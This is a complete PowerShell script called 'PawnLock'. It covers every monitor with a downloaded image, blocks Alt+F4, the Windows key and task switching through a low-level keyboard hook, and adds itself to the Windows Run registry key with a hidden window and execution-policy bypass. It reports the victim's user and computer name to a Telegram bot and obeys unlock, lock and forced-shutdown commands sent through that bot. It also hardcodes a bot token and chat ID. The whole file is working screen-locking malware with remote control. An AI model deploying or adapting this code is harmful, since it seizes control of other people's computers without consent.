# CONFIGURATION
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\lockscreen.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$LockFile = "$env:APPDATA\Microsoft\lock_status.txt"
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunValue = "PawnLock"

# CREATE LOCK FILE IF MISSING
if (-not (Test-Path $LockFile)) { "locked" | Out-File -FilePath $LockFile -Force -Encoding ASCII }
else {
    $state = Get-Content $LockFile -ErrorAction SilentlyContinue
    if ($state -eq "unlocked") {
        Remove-ItemProperty -Path $RunKey -Name $RunValue -ErrorAction SilentlyContinue
        return
    }
}

# ADD TO STARTUP IF RUNNING FROM FILE
if ($MyInvocation.MyCommand.Path) {
    $cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Set-ItemProperty -Path $RunKey -Name $RunValue -Value $cmd -Force
}

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# LOAD FORMS
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# BLOCK ALT+F4 AND SHORTCUT KEYS
Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hook = IntPtr.Zero;
    private static HookProc proc = HookCallback;
    private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint threadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void Block() {
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
    }
    public static void Unblock() {
        if (hook != IntPtr.Zero) UnhookWindowsHookEx(hook);
    }
    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
        if (code >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            bool alt = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
            bool ctrl = (Control.ModifierKeys & Keys.Control) == Keys.Control;
            if (alt && key == Keys.F4) return (IntPtr)1;
            if (key == Keys.LWin || key == Keys.RWin || (alt && key == Keys.Tab) || (ctrl && key == Keys.Escape)) return (IntPtr)1;
        }
        return CallNextHookEx(hook, code, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# SHOW FULLSCREEN IMAGE ON ALL MONITORS
$forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; TopMost = $true;
        Bounds = $screen.Bounds; ShowInTaskbar = $false; KeyPreview = $true
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{ Image = [Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'Zoom' }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# TELEGRAM NOTIFICATION
$msg = "PC-ul $user ($pc) a fost blocat!\nComenzi:\n$unlockCommand\n$shutdownCommand\n$lockCommand"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{chat_id=$chatID;text=$msg}|ConvertTo-Json) -ContentType 'application/json'

# LISTENER
$script:AllowClose = $false
$offset = 0
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $resp = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($update in $resp.result) {
            $offset = $update.update_id + 1
            $txt = $update.message.text.ToLower()
            if ($txt -eq "/unlock$user") {
                "unlocked" | Out-File $LockFile -Force
                Remove-ItemProperty $RunKey -Name $RunValue -ErrorAction SilentlyContinue
                $script:AllowClose = $true
                [Windows.Forms.Application]::Exit()
            }
            elseif ($txt -eq "/shutdown$user") {
                Remove-ItemProperty $RunKey -Name $RunValue -ErrorAction SilentlyContinue
                Stop-Computer -Force
            }
            elseif ($txt -eq "/lock$user") {
                "locked" | Out-File $LockFile -Force
                Set-ItemProperty -Path $RunKey -Name $RunValue -Value $cmd -Force
            }
        }
    } catch {}
})
$timer.Start()

# START APPLICATION
[Windows.Forms.Application]::Run()

# CLEANUP
$timer.Stop()
foreach ($f in $forms) { if (!$f.IsDisposed) { $f.Close(); $f.Dispose() } }
[KeyBlocker]::Unblock()
